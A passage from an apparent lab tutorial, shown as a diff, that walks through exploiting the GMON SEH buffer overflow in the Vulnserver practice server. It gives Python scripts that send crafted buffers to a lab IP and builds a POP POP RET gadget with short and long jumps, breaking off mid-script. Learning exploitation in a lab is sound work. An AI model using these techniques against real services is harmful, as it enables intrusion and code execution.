+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>Run this script against the server.</p>
+<p>Once the server is in the crashed state, open the SEH chain window again with <code>&lt;Alt&gt;</code> + <code>&lt;S&gt;</code></p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="SEH Chain offset" src="/assets/img/vulnserver_gmon_20_seh_offset.png"/></div></div></p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>SEH chain of thread 00000F2C
+Address    SE handler
+--------   -----------------------
+00DDFFCC   6F45346F
+45336F45   *** CORRUPT ENTRY ***
+</code></pre></div></div></div>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>msf-pattern_offset -l <span class="m">4096</span> -q 6F45346F
+
+<span class="o">[</span>*<span class="o">]</span> Exact match at offset <span class="m">3553</span>
+</code></pre></div></div></div>
+<p>Let us confirm that we control the SEH record with this offset:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># GMON - SEH based buffer overflow</span>
+<span class="c1"># Step 3 - control nseh</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">3553</span> <span class="o">-</span> <span class="mi">4</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"GMON /."</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">offset</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"B"</span> <span class="o">*</span> <span class="mi">4</span>   <span class="c1"># NSEH</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"C"</span> <span class="o">*</span> <span class="mi">4</span>   <span class="c1"># SEH</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"D"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="SEH Control" src="/assets/img/vulnserver_gmon_21_seh_control.png"/></div></div></p>
+<p>Now we control the NSEH (<code>BBBB</code>) and SEH (<code>CCCC</code>) pointers.</p>
+<h2 id="bad-characters">Bad Characters<a class="headerlink" href="#bad-characters" title="Permanent link"> </a></h2>
+<p>Before we move on we will have to figure out which byte values might break our jump addresses and shellcode.</p>
+<p>For the TRUN buffer overflow we put the badchar test string after the EIP overwrite. Putting it after the SEH overwrite is a bit more problematic. We only have 11 * 4 Bytes available.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Limited Space" src="/assets/img/vulnserver_gmon_30_badchar_problems.png"/></div></div></p>
+<p>So we have two choices:</p>
+<ol>
+<li>Put the full test string <strong>before</strong> the overwrite and hope that no possible bad char might break the overflow completely</li>
+<li>Split the test string into several (11 * 4 = 44 byte sized) parts and test each one individually <strong>after</strong> the overwrite</li>
+</ol>
+<p>The first choice is the correct one since the (first) exception is not caused by overwritting the SEH record anyway. A bad char, which could break the overflow, will break it regardless of where we put it.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># GMON - SEH based buffer overflow</span>
+<span class="c1"># Step 3 - find bad characters</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">3553</span> <span class="o">-</span> <span class="mi">4</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="c1"># new line 0x0a</span>
+
+<span class="c1"># generate bad char test string</span>
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0a</span> <span class="p">]</span> <span class="c1"># found badchars to exclude from test</span>
+<span class="n">badstring</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">):</span>
+        <span class="n">badstring</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">x</span><span class="p">])</span>
+
+<span class="c1"># write generated badchars to file for mona</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'/srv/samba/protected/badchars.bin'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">badstring</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"GMON /."</span>
+
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span>         <span class="c1"># alignment (1 Byte)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">badstring</span>    <span class="c1"># bad char test string</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">badstring</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span> <span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"B"</span> <span class="o">*</span> <span class="mi">4</span>         <span class="c1"># NSEH</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"C"</span> <span class="o">*</span> <span class="mi">4</span>         <span class="c1"># SEHandler</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"D"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>Please note that I added one <code>A</code> (<code>0x41</code>) byte before the badchar test string since the byte string <code>GMON /.</code> is only 7 bytes long. This will align the start of the test string properly.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Bad char test" src="/assets/img/vulnserver_gmon_31_badchar_test.png"/></div></div></p>
+<p>The buffer overflow still works, so we do not have any overflow breaking bad chars. Let us see if we find any other bad chars:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="c1"># start of badchar test string on stack</span>
+__stack__
+0104F1F0   <span class="m">04030201</span>
+</code></pre></div></div></div>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>!mona compare -f Y:<span class="se">\b</span>adchars.bin -t raw -a 0104F1F0
+</code></pre></div></div></div>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Test string is unmodified" src="/assets/img/vulnserver_gmon_32_badchar_clear.png"/></div></div></p>
+<p>Looks like we are in the clear. Mona reports the badchar test string is unmodified on the stack.</p>
+<h2 id="pop-pop-return">Pop Pop Return<a class="headerlink" href="#pop-pop-return" title="Permanent link"> </a></h2>
+<p>As I mentioned above a <code>JMP ESP</code> on its own won't work here because the ESP does not point at any part of the stack that we control directly.</p>
+<p>The question then naturally arises: Can't we just move the ESP?</p>
+<p>The most obvious way would simply adding or subtracting a value from the address stored in the ESP until it points at our controlled stack space. </p>
+<p>But so far the only control we have over the program is the abiltiy to perform a jump to some valid address. In other words we can only jump to some existing segment of instructions that has been loaded into memory and has a static address. </p>
+<p>Before we try to look for a fitting gadget, let us take a look again where the ESP ends up at after passing the first exception with <code>&lt;Shift&gt;</code> + <code>&lt;F9&gt;</code></p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="SEHandler" src="/assets/img/vulnserver_gmon_40_seh_handler.png"/></div></div></p>
+<p>If you look at the Stack window, then it appears that the ESP points at some sort of exception handler. And only two steps below it is the address of our overwritten NSEH (We put BBBB there).</p>
+<p>If we could move the ESP by only two steps (ESP + 4 + 4), then it would point at that address of our NSEH entry. A part of the stack that we have direct control over.</p>
+<p>Then we could load that address into some register and jump to it, or even better, we could use a return instruction.</p>
+<p>A return <code>RET</code> instruction works similar to a <code>JMP ESP</code>, but it does not jump directly to the value of the ESP. Rather it looks where the ESP points at and then uses that value for the jump. So basically exactly what we want to do.</p>
+<p>Now how do we move the ESP by those two steps?</p>
+<p>There are two basic stack operations:</p>
+<p><strong>PUSH</strong> (add) a value onto the top of the stack and move the stack pointer one position forward to match the new entry. Forward in this case means a 4 byte lower memory address. (ESP = ESP - 4)</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>PUSH &lt;<span class="nb">source</span> register/value&gt;
+</code></pre></div></div></div>
+<p><strong>POP</strong> (read and remove) a value from the top of the stack into a register. And move the stack pointer one position back to match the entry before the read/removed one. In this case this means a 4 byte higher memory address (ESP = ESP + 4).</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>POP &lt;target register&gt;
+</code></pre></div></div></div>
+<p>Each of these two instructions will move the ESP (stack pointer), since the main purpose of the stack pointer is to keep track of the top of the stack. It can be a bit confusing that a PUSH would result in a lower ESP, but in x86 the stack grows from a high address towards a low address (grows downwards numerically). But in our debugger stack view it grows upwards.</p>
+<p>So a POP will move the ESP to a 4 Byte higher address (ESP = ESP + 4).</p>
+<p>If we can do two POP's and a RET, then we are golden.</p>
+<p>The target register for the POP instruction does not really matter to us. We are only interested in the indirect effect of moving the stack pointer (ESP).</p>
+<p>Since this is a very commonly used gadget, mona can find some PPR gadgets for us:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>!mona seh
+</code></pre></div></div></div>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Mona finds PPR candidates" src="/assets/img/vulnserver_gmon_50_mona_ppr.png"/></div></div></p>
+<p>Important here is that SafeSEH should preferably be <code>False</code> and the address should not contain any of our found bad chars.</p>
+<p>The first address in the list fits these requirements:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>0x625010b4 : 
+
+  pop ebx 
+  pop ebp 
+  ret  
+
+<span class="p">|</span>  <span class="o">{</span>PAGE_EXECUTE_READ<span class="o">}</span> <span class="o">[</span>essfunc.dll<span class="o">]</span> ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- <span class="o">(</span>C:<span class="se">\U</span>sers<span class="se">\I</span>EUser<span class="se">\D</span>esktop<span class="se">\e</span>ssfunc.dll<span class="o">)</span>
+</code></pre></div></div></div>
+<p>Let us test if it works:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># GMON - SEH based buffer overflow</span>
+<span class="c1"># Step 4 - POP POP RET</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">3553</span> <span class="o">-</span> <span class="mi">4</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="c1"># new line 0x0a</span>
+
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0a</span> <span class="p">]</span> <span class="c1"># found badchars</span>
+
+<span class="n">ppr_address</span> <span class="o">=</span> <span class="mh">0x625010b4</span>    <span class="c1"># address of POP POP RET gadget</span>
+<span class="n">ppr_gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">ppr_address</span><span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"GMON /."</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="n">offset</span>
+
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"B"</span> <span class="o">*</span> <span class="mi">4</span>          <span class="c1"># NSEH: this will get executed as instructions</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">ppr_gadget</span>        <span class="c1"># SEH address -&gt; POP POP RET</span>
+
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"D"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>Before you run this make sure to set a breakpoint on <code>625010b4</code> so we can see whether the jump back to our NSEH overwrite works.</p>
+<p>Use <code>&lt;Shift&gt;</code> + <code>&lt;F9&gt;</code> in order to pass the exception and then you should hit the breakpoint. Skip forward with <code>F7</code> to confirm that we bounce back to our controlled stack space.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="PPR Breakpoint" src="/assets/img/vulnserver_gmon_51_mona_ppr.png"/></div></div></p>
+<p>After running through the POP POP RET the EIP (Instruction Pointer) will point at our NSEH (<code>BBBB</code>):</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="After PPR" src="/assets/img/vulnserver_gmon_52_after_ppr.png"/></div></div></p>
+<p>That appears to have worked.</p>
+<h2 id="short-jump-out-of-nseh">Short Jump out of NSEH<a class="headerlink" href="#short-jump-out-of-nseh" title="Permanent link"> </a></h2>
+<p>Now we have code execution. Kind of. </p>
+<p>We are limited to the four bytes of the overwritten NSEH. After executing the four bytes of the NSEH, the EIP will hit our PPR jump address and presumably cause another exception.</p>
+<p>In order to prevent that from happening we will have to perform a jump.</p>
+<p>There are three different jump types in x86: <strong>long</strong>, <strong>short</strong> and <strong>near</strong> jump</p>
+<p>A long jump won't fit in our 4 bytes, being 5 bytes long:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code>$ msf-nasm_shell
+ nasm &gt; 
+ nasm &gt; jmp -8
+ <span class="m">00000000</span>  E9F3FFFFFF        jmp 0xfffffff8
+</code></pre></div></div></div>
+<p>A short jump fits though. It is only two bytes long:</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code> nasm &gt; jmp <span class="nv">$-</span><span class="m">16</span>
+ <span class="m">00000000</span>  EBEE              jmp short 0xfffffff0
+</code></pre></div></div></div>
+<p>Due to the limited range of a short jump we can only jump -126 bytes backwards. But we can just jump back a few bytes and from there perform a long jump.</p>
+<p>So let us jump back 16 bytes. That should be more than enough space for a long jump.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># GMON - SEH based buffer overflow</span>
+<span class="c1"># Step 5a - Short Jump out of NSEH</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">3549</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="c1"># new line 0x0a</span>
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0a</span> <span class="p">]</span> <span class="c1"># found badchars</span>
+<span class="n">NOP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span>
+
+<span class="n">ppr_address</span> <span class="o">=</span> <span class="mh">0x625010b4</span>
+<span class="n">ppr_gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">ppr_address</span><span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"GMON /."</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="c1"># Short jump should end up here</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"C"</span> <span class="o">*</span> <span class="mi">16</span>
+
+<span class="c1"># Step 1 -- NSEH Overwrite -- short jump</span>
+<span class="c1"># jump back 16 bytes</span>
+<span class="c1"># nasm&gt;  jmp $-16</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xEB\xEE</span><span class="s2">"</span> <span class="o">+</span> <span class="n">NOP</span> <span class="o">+</span> <span class="n">NOP</span>
+
+<span class="c1"># Step 0 -- SEH Overwrite -- jump to pop pop return</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">ppr_gadget</span>
+
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"D"</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">line_ending</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
+
+<span class="c1"># receive banner</span>
+<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+
+<span class="c1"># send evil buffer</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Sending evil buffer with </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes and payload length </span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">..."</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># receive response</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Done!"</span><span class="p">)</span>
+</code></pre></div></div></div>
+<p>Make sure to set the breakpoint again on the PPR address before you run this.</p>
+<p><div class="breaker breaker-image"><div class="repairman"><img alt="Short Jump" src="/assets/img/vulnserver_gmon_60_small_jump.png"/></div></div></p>
+<p>We should end up in the new 16 C's that we added as placeholder.</p>
+<h2 id="long-jump-to-the-buffer-start">Long Jump to the Buffer Start<a class="headerlink" href="#long-jump-to-the-buffer-start" title="Permanent link"> </a></h2>
+<p>The NSEH offset was 3549 bytes from the start of the buffer.</p>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="m">3549</span> - <span class="nv">16</span> <span class="o">=</span> <span class="m">3533</span>
+</code></pre></div></div></div>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code> nasm &gt; jmp -3533
+ <span class="m">00000000</span>  E92EF2FFFF        jmp 0xfffff233
+</code></pre></div></div></div>
+<div class="breaker"><div class="repairman"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># GMON - SEH based buffer overflow</span>
+<span class="c1"># Step 5b - Long jump to the start of the buffer</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">3549</span>
+<span class="n">size</span> <span class="o">=</span> <span class="mi">4096</span>
+<span class="n">target_ip</span> <span class="o">=</span> <span class="s2">"10.0.2.74"</span>
+<span class="n">target_port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="n">line_ending</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="c1"># new line 0x0a</span>
+<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0a</span> <span class="p">]</span> <span class="c1"># found badchars</span>
+<span class="n">NOP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span>
+
+<span class="n">ppr_address</span> <span class="o">=</span> <span class="mh">0x625010b4</span>
+<span class="n">ppr_gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">ppr_address</span><span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"GMON /."</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="c1"># Step 2 -- long jump</span>
+<span class="c1"># jump back 3533 bytes to the start of the AAAA</span>
+<span class="c1"># nasm&gt;  jmp -3533</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xE9\x2E\xF2\xFF\xFF</span><span class="s2">"</span>  <span class="c1"># step 2:   jmp -3533</span>
